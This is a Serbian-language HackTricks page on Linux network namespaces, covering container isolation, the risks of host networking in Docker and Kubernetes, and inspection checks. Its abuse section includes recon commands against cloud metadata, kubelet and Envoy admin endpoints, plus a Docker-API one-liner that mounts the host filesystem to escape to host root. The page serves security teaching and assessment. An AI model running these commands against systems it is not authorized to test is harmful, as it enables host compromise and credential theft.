# Mrežni namespace

{{#include ../../../../../banners/hacktricks-training.md}}

## Pregled

Mrežni namespace izoluje resurse povezane s mrežom, kao što su interfejsi, IP adrese, routing tabele, ARP/neighbor stanje, firewall pravila, socketi, abstract socket namespace UNIX domena i sadržaj datoteka kao što je `/proc/net`.<sup>[[2]](#references)</sup> Zbog toga container može imati ono što izgleda kao sopstveni `eth0`, sopstvene lokalne rute i sopstveni loopback uređaj, a da pritom ne poseduje stvarni mrežni stack hosta.

Sa stanovišta bezbednosti, ovo je važno zato što se mrežna izolacija odnosi na mnogo više od bindovanja portova. Privatni mrežni namespace ograničava šta workload može direktno da posmatra ili rekonfiguriše. Kada se taj namespace podeli sa hostom, container može iznenada dobiti uvid u listenere na hostu, lokalne servise hosta, abstract AF_UNIX endpoint-e i mrežne kontrolne tačke koje nikada nisu bile namenjene izlaganju aplikaciji.

## Rad

Novo kreirani mrežni namespace počinje sa praznim ili gotovo praznim mrežnim okruženjem dok se interfejsi ne priključe na njega. Container runtime-i zatim kreiraju ili povezuju virtuelne interfejse, dodeljuju adrese i konfigurišu rute kako bi workload imao očekivanu povezanost. U deployment-ima zasnovanim na bridge-u, to obično znači da container vidi interfejs zasnovan na veth-u, povezan sa bridge-om na hostu. U Kubernetes-u, CNI plugin-i obavljaju ekvivalentno podešavanje za Pod networking.

Ova arhitektura objašnjava zašto su `--network=host` ili `hostNetwork: true` tako dramatična promena. Umesto da dobije pripremljen privatni mrežni stack, workload se priključuje stvarnom mrežnom stack-u hosta.

## Laboratorija

Gotovo prazan mrežni namespace možete videti pomoću:
```bash
sudo unshare --net --fork bash
ip addr
ip route
```
A možete uporediti normalne kontejnere i kontejnere koji koriste host mrežu pomoću:
```bash
docker run --rm debian:stable-slim sh -c 'ip addr || ifconfig'
docker run --rm --network=host debian:stable-slim sh -c 'ss -lntp | head'
```
Container sa host networking-om više nema sopstveni izolovani prikaz socket-a i interfejsa. Sama ta promena je već značajna, čak i pre nego što se zapitate koje capabilities proces ima.

## Upotreba u runtime-u

Docker i Podman obično kreiraju privatni network namespace za svaki container, osim ako nisu drugačije konfigurisani. Kubernetes obično svakom Pod-u dodeljuje sopstveni network namespace, koji dele container-i unutar tog Pod-a, ali koji je odvojen od host-a. To znači da je `127.0.0.1` obično lokalni prikaz za Pod, a ne za pojedinačni container: listener vezan samo za localhost u jednom container-u obično je dostupan njegovim sidecar-ima i susednim container-ima. Incus/LXC sistemi takođe obezbeđuju bogatu izolaciju zasnovanu na network namespace-ovima, često sa širim izborom virtuelnih networking postavki.

Zajednički princip je da je privatno networking podrazumevana granica izolacije, dok je host networking eksplicitno isključivanje te granice.

## Pogrešne konfiguracije

Najvažnija pogrešna konfiguracija je jednostavno deljenje host network namespace-a. To se ponekad radi zbog performansi, low-level monitoringa ili praktičnosti, ali time se uklanja jedna od najčistijih granica dostupnih container-ima. Listener-i dostupni na host-u postaju direktnije dostupni, servisi dostupni samo preko localhost-a mogu postati pristupačni, a capabilities kao što su `CAP_NET_ADMIN` ili `CAP_NET_RAW` postaju mnogo opasnije jer se operacije koje omogućavaju sada primenjuju na sopstveno networking okruženje host-a.

Drugi problem je dodeljivanje previše network-related capabilities čak i kada je network namespace privatan. Privatni namespace pomaže, ali ne čini raw socket-e ili naprednu kontrolu networking-a bezopasnim.

U Kubernetes-u, `hostNetwork: true` takođe menja koliko možete da se oslonite na network segmentation na nivou Pod-a. Kubernetes navodi da mnogi network plugin-ovi ne mogu pravilno da razlikuju saobraćaj iz `hostNetwork` Pod-a pri `podSelector` / `namespaceSelector` uparivanju i zato ga tretiraju kao običan saobraćaj node-a.<sup>[[1]](#references)</sup> Iz ugla napadača, to znači da kompromitovani `hostNetwork` workload često treba tretirati kao network foothold na nivou node-a, a ne kao običan Pod koji je i dalje ograničen istim pretpostavkama policy-ja kao workload-ovi na overlay network-u.

## Zloupotreba

U slabo izolovanim postavkama, napadači mogu da pregledaju listening servise host-a, pristupe management endpoint-ima vezanim samo za loopback, prisluškuju ili ometaju saobraćaj u zavisnosti od konkretnih capabilities i okruženja, ili da promene routing i stanje firewall-a ako je prisutan `CAP_NET_ADMIN`. U cluster-u ovo takođe može olakšati lateral movement i reconnaissance control plane-a.

Ako sumnjate na host networking, počnite potvrđivanjem da vidljivi interfejsi i listener-i pripadaju host-u, a ne izolovanoj container mreži:
```bash
ip addr
ip route
ss -lntup | head -n 50
```
Servisi dostupni samo preko loopback-a često su prvo zanimljivo otkriće:
```bash
ss -lntp | grep '127.0.0.1'
curl -s http://127.0.0.1:2375/version 2>/dev/null
curl -sk https://127.0.0.1:2376/version 2>/dev/null
```
Apstraktni UNIX socketi su još jedna meta koju je lako prevideti, jer su ograničeni na network namespace iako ne izgledaju kao TCP/UDP listeneri i možda uopšte ne postoje kao putanje sistema datoteka ispod `/run`. Container sa host network-om zato može naslediti pristup control kanalima dostupnim samo na hostu, koji nikada nisu bili bind-mountovani u container:
```bash
ss -xap 2>/dev/null | head -n 50
grep -a '@' /proc/net/unix 2>/dev/null | head -n 50
```
Istorijski primer bila je greška u izlaganju abstract socket-a `containerd-shim`, ali šira pouka je važnija od konkretnog CVE-a: čim se workload pridruži host network namespace-u, abstract AF_UNIX servisi takođe postaju deo attack surface-a.<sup>[[3]](#references)</sup> Ako ti socket-i deluju kao da su povezani sa runtime-om ili administracijom, pređi na [Runtime API And Daemon Exposure](../../runtime-api-and-daemon-exposure.md).

Ako su network capabilities prisutne, testiraj da li workload može da pregleda ili menja vidljivi stack:
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw'
iptables -S 2>/dev/null || nft list ruleset 2>/dev/null
ip link show
```
Na modernim kernelima, host networking zajedno sa `CAP_NET_ADMIN` može takođe omogućiti pristup putanji paketa izvan jednostavnih izmena `iptables` / `nftables`. `tc` qdiscs i filteri su takođe ograničeni na namespace, pa se u deljenom host network namespace-u primenjuju na host interfejse koje container može da vidi. Ako je dodatno prisutan `CAP_BPF`, relevantni postaju i eBPF programi povezani sa mrežom, kao što su TC i XDP loaderi:<sup>[[4]](#references)</sup>
```bash
capsh --print | grep -E 'cap_net_admin|cap_net_raw|cap_bpf'
for i in $(ls /sys/class/net 2>/dev/null); do
echo "== $i =="
tc qdisc show dev "$i" 2>/dev/null
tc filter show dev "$i" ingress 2>/dev/null
tc filter show dev "$i" egress 2>/dev/null
done
bpftool net 2>/dev/null
```
Ovo je važno zato što napadač može da presreće, preusmerava, oblikuje ili odbacuje saobraćaj na nivou interfejsa hosta, a ne samo da menja firewall pravila. U privatnom network namespace-u te radnje su ograničene na prikaz kontejnera; u deljenom host namespace-u utiču na host.

U cluster ili cloud okruženjima, host networking takođe opravdava brzi lokalni recon metadata i servisa bliskih control plane-u:
```bash
for u in \
http://169.254.169.254/latest/meta-data/ \
http://100.100.100.200/latest/meta-data/ \
http://127.0.0.1:10250/pods; do
curl -m 2 -s "$u" 2>/dev/null | head
done
```
U Kubernetesu, imajte na umu da kompromitovanje **bilo kog** containera u Podu sa više containera takođe omogućava pristup localhost listenerima koje su otvorili susedni containeri i sidecar-i, jer ceo Pod deli jedan network namespace. Ovo je naročito relevantno za service-mesh, observability i pomoćne containere čiji su admin ili debug interfejsi namerno dostupni samo unutar Poda, a ne na nivou celog clustera:
```bash
ss -lntup | grep -E '127.0.0.1|::1'
curl -s http://127.0.0.1:15000/server_info 2>/dev/null | head
curl -s http://127.0.0.1:15000/config_dump 2>/dev/null | head
```
Tretirajte „bound to localhost“ kao **Pod-private**, a ne kao **container-private**. Nakon što je jedan container u Pod-u kompromitovan, ta pretpostavka više ne važi.

### Potpun primer: Host Networking + Local Runtime / Kubelet Access

Host networking ne omogućava automatski host root, ali često izlaže servise koji su namerno dostupni samo sa samog node-a. Ako je neki od tih servisa slabo zaštićen, host networking postaje direktan put za privilege-escalation.

Docker API na localhost:
```bash
curl -s http://127.0.0.1:2375/version 2>/dev/null
docker -H tcp://127.0.0.1:2375 run --rm -it -v /:/mnt ubuntu chroot /mnt bash 2>/dev/null
```
Kubelet na localhost-u:
```bash
curl -k https://127.0.0.1:10250/pods 2>/dev/null | head
curl -k https://127.0.0.1:10250/runningpods/ 2>/dev/null | head
```
Impact:

- direktan kompromis hosta ako je lokalni runtime API izložen bez odgovarajuće zaštite
- izviđanje clustera ili lateralno kretanje ako su kubelet ili lokalni agenti dostupni
- manipulacija saobraćajem ili denial of service u kombinaciji sa `CAP_NET_ADMIN`

## Provere

Cilj ovih provera je da se utvrdi da li proces ima privatni network stack, koje rute i listenere može da vidi i da li network prikaz već liči na host pre nego što uopšte testirate capabilities.
```bash
readlink /proc/self/ns/net   # Current network namespace identifier
readlink /proc/1/ns/net      # Compare with PID 1 in the current container / pod
lsns -t net 2>/dev/null      # Reachable network namespaces from this view
ip netns identify $$ 2>/dev/null
ip addr                      # Visible interfaces and addresses
ip route                     # Routing table
ss -lntup                    # Listening TCP/UDP sockets with process info
ss -xap                      # UNIX sockets, including abstract namespace entries
grep -a '@' /proc/net/unix   # Quick view of abstract AF_UNIX sockets in this netns
```
Šta je ovde zanimljivo:

- Ako `/proc/self/ns/net` i `/proc/1/ns/net` već izgledaju kao host, container možda deli host network namespace ili drugi non-private namespace.
- `lsns -t net` i `ip netns identify` su korisni kada je shell već unutar imenovanog ili persistent namespace-a i želite da ga povežete sa objektima u `/run/netns` sa host strane.
- `ss -lntup` je naročito vredan jer otkriva listenere ograničene na loopback i lokalne management endpoint-e. `ss -xap` i `/proc/net/unix` dodaju prikaz abstract socket-a koji uobičajene pretrage socket-a u filesystem-u propuštaju.
- Rute, nazivi interfejsa, firewall kontekst, `tc` stanje i eBPF attachments postaju mnogo važniji ako su prisutni `CAP_NET_ADMIN`, `CAP_NET_RAW` ili `CAP_BPF`.
- U Kubernetes-u, neuspešna rezolucija naziva service-a iz `hostNetwork` Pod-a može jednostavno značiti da Pod ne koristi `dnsPolicy: ClusterFirstWithHostNet`, a ne da service ne postoji.
- U multi-container Pod-ovima, localhost listeneri pripadaju celom Pod network namespace-u, zato proverite sidecar-e i sibling container-e pre nego što pretpostavite da je port ograničen na loopback nedostupan iz kompromitovanog container-a.

Prilikom pregleda container-a uvek procenite network namespace zajedno sa skupom capabilities. Host networking sa snažnim network capabilities predstavlja potpuno drugačiji posture od bridge networking-a sa uskim podrazumevanim skupom capabilities.

## Reference

- [1] [Kubernetes NetworkPolicy i napomene u vezi sa `hostNetwork`](https://kubernetes.io/docs/concepts/services-networking/network-policies/)
- [2] [Linux `network_namespaces(7)` i izolacija abstract UNIX socket-a](https://man7.org/linux/man-pages/man7/network_namespaces.7.html)
- [3] [containerd advisory: abstract Unix domain socket-i izloženi container-ima koji koriste host-network](https://github.com/containerd/containerd/security/advisories/GHSA-36xw-fx78-c5r4)
- [4] [eBPF token i capability zahtevi za network-related eBPF programe](https://docs.ebpf.io/linux/concepts/token/)

{{#include ../../../../../banners/hacktricks-training.md}}
